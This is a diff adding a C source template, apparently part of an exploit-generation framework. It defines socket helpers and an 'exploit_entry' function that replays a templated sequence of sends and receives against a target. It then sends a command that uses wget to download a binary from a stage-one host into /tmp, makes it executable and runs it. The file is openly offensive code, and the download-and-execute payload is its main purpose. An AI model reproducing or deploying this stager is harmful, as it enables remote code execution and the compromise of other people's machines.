@@ -1,0 +1,127 @@
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int connect_target(const char *target_ip, int target_port)
+{
+    int sock;
+    struct sockaddr_in target_addr;
+
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        return -2;
+    }
+
+    struct timeval tv;
+    tv.tv_sec = 5;
+    tv.tv_usec = 0;
+    if(setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv)) {
+    	perror("setsockopt");
+    	return -7;
+    };
+
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(target_port);
+    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return -6;
+    }
+
+    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
+        perror("connect");
+        return -5;
+    }
+
+    return sock;
+}
+
+ssize_t sendall(int sock, const char *data, size_t size)
+{
+    size_t sent = 0;
+    while (sent < size) {
+        int onesent = send(sock, data, size-sent, 0);
+        if (onesent < 0) {
+            return onesent;
+        }
+        sent += onesent;
+    }
+    return sent;
+}
+
+ssize_t recvall(int sock, char **data)
+{
+    char *result = NULL;
+    size_t resultsize = 0;
+    char buf[4096];
+
+    while (1) {
+        int onesize = recv(sock, buf, sizeof(buf), 0);
+        if (onesize < 0) {
+            free(result);
+            if (data) {
+                *data = NULL;
+            }
+            return onesize;
+        }
+        if (onesize == 0) {
+            if (data) {
+                *data = result;
+            }
+            return resultsize;
+        }
+
+        resultsize += onesize;
+        result = realloc(result, resultsize);
+        memcpy(&result[resultsize - onesize], buf, onesize);
+    }
+}
+
+uint8_t exploit_entry(uint8_t ip_type,
+                      const char* target_ip, int target_port,
+                      uint32_t ipv6_scope_id,
+                      const char* stage1_ip, int stage1_port)
+{
+
+    int sock;
+
+    sock = connect_target(target_ip, target_port);
+    if (sock < 0) {
+        return -sock;
+    }
+    {% for action, argument in actions %}
+      {% if action == 'recv' %}
+        {% set function = 'recvn' %}
+        {% set arg1 = argument %}
+        {% set arg2 = None %}
+      {% elif action == 'recvuntil' %}
+        {% set function = 'recvuntil' %}
+        {% set arg1 = argument | cstring %}
+        {% set arg2 = argument | length %}
+      {% elif action == 'recvall' %}
+        {% set function = 'recvuntil' %}
+        {% set arg1 = 'NULL' %}
+        {% set arg2 = None %}
+      {% elif action == 'send' %}
+        {% set function = 'sendall' %}
+        {% set arg1 = argument | cstring %}
+        {% set arg2 = argument | length %}
+      {% endif %}
+
+    if ({{ function }}(sock, {{ arg1 }}{% if arg2 %}, {{ arg2 }}{% endif %}) < 0) {
+        return -1;
+    }
+    {% endfor %}
+
+    char payload[4096];
+    snprintf(payload, 4096, "/bin/wget -O - http://%s:%d/i386_LITTLE_LINUX > /tmp/exploit; chmod +x /tmp/exploit; /tmp/exploit", stage1_ip, stage1_port);
+    sendall(sock, payload, strlen(payload));
+
+    close(sock);
+
+    return 0;
+}
